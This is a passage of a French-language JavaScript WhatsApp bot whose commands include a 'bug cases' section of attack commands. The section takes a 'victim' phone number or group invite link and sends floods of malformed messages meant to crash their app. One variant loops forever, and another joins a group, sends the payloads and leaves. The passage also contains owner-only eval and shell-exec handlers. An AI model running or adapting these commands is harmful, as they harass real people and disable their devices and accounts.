                        caption: kevmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's5') {
                    Kev.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: kevmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 's6') {
                    Kev.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: kevmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 's7') {
                    Kev.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: kevmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 's8') {
                	Kev.sendMessage(m.chat, {
      video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
      gifPlayback: true,
      caption: kevmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://telegra.ph/file/2800c0d2e02e3afcb4033.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 's9') {
                	Kev.sendMessage(m.chat, {
video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
caption: kevmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: global.xchannel.jid,
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://telegra.ph/file/2800c0d2e02e3afcb4033.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 's10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: kevmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Tout-Menu🧾","id":"${prefix}tout-menu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 's11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: kevmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Tout-Menu🧾","id":"${prefix}tout-menu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await Kev.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 's12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: kevmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU🧾",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"TOUT-MENU",
"title":"cliquez pour selectionner",
"description":"Afficher la liste de toutes les commandes",
"id":"${prefix}tout-menu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break

 //bug cases
case "sylvers-droid": {
  if (!TontonKev) return
  if (!text) return replygckev(`Usage ${prefix+command} numero de la victime|nombre\nExmple ${prefix+command} 237xxx xxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replygckev(`Usage ${prefix+command} numero de la victime|nombre\nExemple ${prefix+command} 237xxx xxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return replygckev("le nombre de bug doit etre un chiffre");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await Kev.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "237656774511") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygckev("Ce numero n est pas enregistrey sur WhatsApp ");
  }
  replygckev("veuillez patienter, " + command + " bug encours...");
  await sleep(2000); // Adjusted sleep time for clarity
  sendVariousMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Bug send avec succes a @" + whatsappNumber.split('@')[0] + 
    " Utilisant *" + command + "* ✅\n\nVeuillez faire une pause de 2 minutes ou vous risquez une suspension.", 
    [whatsappNumber]
  );
}
break;
case "sylvers-ios": {
  if (!TontonKev) return
  if (!text) return replygckev(`Usage ${prefix+command} numero de la victime|nombre\nExemple ${prefix+command} 237xxx xxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replygckev(`Usage ${prefix+command} numero de la victime|nombre\nExemple ${prefix+command} 237xxx xxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return replygckev("le nombre de bug doit etre un chiffre");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await Kev.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "237656774511") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygckev("Ce numero n est pas enregistrey sur WhatsApp ");
  }
  replygckev("veuillez patienter, " + command + " bug encours...");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMultiplePaymentInvites(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Bug send avec succes a @" + whatsappNumber.split('@')[0] + 
    " Utilisant *" + command + "* ✅\n\nVeuillez faire une pause de 2 minutes ou vous risquez une suspension.", 
    [whatsappNumber]
  );
}
break;
case "sylvers-ios2":
  {
	if (!TontonKev) return
    if (!isBot) {
      return replygckev("*Cette commande est reservee uniquement au bot!*");
    }
    if (!text){
      return replygckev(`Exemple usage: ${prefix + command} 5`)
      }
    if (isNaN(parseInt(text))) {
      return replygckev("le nombre de bug doit etre un chiffre");
    }
    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
    replygckev("veuillez patienter, " + command + " bug encours...");
    await sleep(1500); // Adjusted sleep time for clarity
    sendMultiplePaymentInvites(m.chat, encodedValue);
    await sleep(2500); // Adjusted sleep time for clarity
    sendReaction('✅');
  }
  break;
  case "sylvers-droid2":
  {
	if (!TontonKev) return
    if (!isBot) {
      return replygckev("*Cette commande est reservee uniquement au bot!*");
    }
    if (!text){
      return replygckev(`Exemple usage: ${prefix + command} 5`)
      }
    if (isNaN(parseInt(text))) {
      return replygckev("le nombre de bug doit etre un chiffre");
    }
    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
    replygckev("veuillez patienter, " + command + " bug encours...");
    await sleep(1500); // Adjusted sleep time for clarity
    sendVariousMessages(m.chat, encodedValue);
    await sleep(2500); // Adjusted sleep time for clarity
    sendReaction('✅');
  }
  break;
  case "sylvers-buggroupe":
  {
    if (!TontonKev) return
    if (!text) {
      return replygckev("*COMMENT BUGGER LE GROUPE *\n\n" + (prefix + command) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ si vous voulez envoyer un nombre elevey de bug, veuillez suivre les etapes suivantes\n\nEx: ." + command + " lien du groupe nombre\n\nExemple:\n." + command + " https://chat.whatsapp.com/xxxx 10");
    }
    replygckev("veuillez patienter, " + command + " bug encours...");
    if (!text.split(" ")[0].includes("whatsapp.com")) {
      return replygckev("Lien Invalide!");
    }
    let groupLink = text.split(" ")[0].split("https://chat.whatsapp.com/")[1];
    try {
      let bugAmount = text.split(" ")[1] ? text.split(" ")[1] : '1';
      let groupTarget = await Kev.groupAcceptInvite(groupLink);
      await sleep(2000); // Adjusted sleep time for clarity
      sendViewOnceMessages(groupTarget, bugAmount);
      await sleep(2500); // Adjusted sleep time for clarity
      replygckev("*BUG SEND DANS LE GROUPE AVEC SUCCES.*");
      Kev.groupLeave(groupTarget);
    } catch (error) {
      replygckev(util.format(error));
    }
  }
  break;
  case "neidy":
  {
	if (!TontonKev) return
    if (!isBot) {
      return replygckev("*Cette commande est reservee uniquement au bot!*");
    }
    if (!text){
      return replygckev(`Example usage: ${prefix + command} 5`)
      }
    if (isNaN(parseInt(text))) {
      return replygckev("le nombre de bug doit etre un chiffre");
    }
    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
    replygckev("veuillez patienter, " + command + " bug encours...");
    await sleep(1500); // Adjusted sleep time for clarity
    sendViewOnceMessages(m.chat, encodedValue);
    await sleep(2500); // Adjusted sleep time for clarity
    sendReaction('✅');
  }
  break;
  case "kenv": {
  if (!TontonKev) return
  if (!text) return replygckev(`Usage ${prefix+command} numerode la victime|nom\nExemple ${prefix+command} 237xxx xxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replygckev(`Usage ${prefix+command} numero de la victime|nombre\nExemple ${prefix+command} 237xxx xxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return replygckev("le nombre de bug doit etre un chiffre");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await Kev.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "237656774511") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygckev("Ce numero n est pas enregistrey sur WhatsApp ");
  }
  replygckev("veuillez patienter, " + command + " bug encours...");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Bug send avec succes a @" + whatsappNumber.split('@')[0] + 
    " Utilisant *" + command + "* ✅\n\nVeuillez faire une pause de 2 minutes ou vous risquez une suspension.", 
    [whatsappNumber]
  );
}
break;
case "kamusari": {
  if (!TontonKev) return
  if (!text) return replygckev(`Usage ${prefix+command} numero de la victime|nombre\nExemple ${prefix+command} 237xxx xxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replygckev(`Usage ${prefix+command} numero de la victime|nombre\nExemple ${prefix+command} 237xxx xxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return replygckev("le nombre de bug doit etre un chiffre");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await Kev.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "237656774511") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygckev("Ce numero n est pas enregistrey sur WhatsApp ");
  }
  replygckev("veuillez patienter, " + command + " bug encours...");
  await sleep(2000); // Adjusted sleep time for clarity
  sendRepeatedMessages2(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Bug send avec succes a @" + whatsappNumber.split('@')[0] + 
    " Utilisant *" + command + "* ✅\n\nVeuillez faire une pause de 2 minutes ou vous risquez une suspension.", 
    [whatsappNumber]
  );
}
break;
case 'sylvers-ios3': case 'ios3': {
            	if (!TontonKev) return
let Kevinouvictim = q.replace(/[^0-9]/g, "")
if (Kevinouvictim.startsWith('0')) return replygckev(`Example : .${command} 237656774511`)
await replygckev(`In process....`)
let target = Kevinouvictim + '@s.whatsapp.net'
  for (;;) {
    await aipong(target)
    await sleep(1200)
  }
}
break
case 'sylvers-all': case 'oneclickall': case 'xsamsung': case 'xwaweb': case 'doublekill': case '💀': case 'triplekill': {
if (!TontonKev) return
if (!q) return replygckev(`Usage .${command} 237656774511`)
let Kevinouvictim = q.replace(/[^0-9]/g, "")
if (Kevinouvictim.startsWith('0')) return replygckev(`Exemple : .${command} 237656774511`)
let target = Kevinouvictim + '@s.whatsapp.net'
await replygckev(`Encours....`)
for (let j = 0; j < 1; j++) {
await listkevfck(target, oneclickkev)
await locationKevinou(target, force)
await kevkillpic(target, oneclickkev)
await locationKevinou(target, force)
await blackening(target, force2)
await locationKevinou(target, force)
}
await replygckev(`Bug send avec succes a ${Kevinouvictim} Utilisant ${command}. ✅`)
}
break

			default:
			if (budy.startsWith('>')) {
				if (!TontonKev) return
				try {
					let evaled = await eval(budy.slice(2))
					if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
					await replygckev(evaled)
				} catch (err) {
					await replygckev(String(err))
				}
			}
			if (budy.startsWith('<')) {
				if (!TontonKev) return
				try {
					let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
					if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
					await replygckev(evaled)
				} catch (err) {
					await replygckev(String(err))
				}
			}
			if (budy.startsWith('$')) {
				if (!TontonKev) return
				if (!text) return
				exec(budy.slice(2), (err, stdout) => {
					if (err) return replygckev(`${err}`)
					if (stdout) return replygckev(stdout)
				})
			}
			if (m.message && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.database
if (!(budy.toLowerCase() in msgs)) return
Kev.copyNForward(m.chat, msgs[budy.toLowerCase()], true, {quoted: m})
}
		}
	} catch (err) {
		console.log(util.format(err))
        let e = String(err)
Kev.sendMessage("237656774511@s.whatsapp.net", { text: "🍁 Hey Tonton Kev, il se peut que nous rencontrons des erreurs, veuillez les reparer svp" + util.format(e), 
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}})
	}
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
});
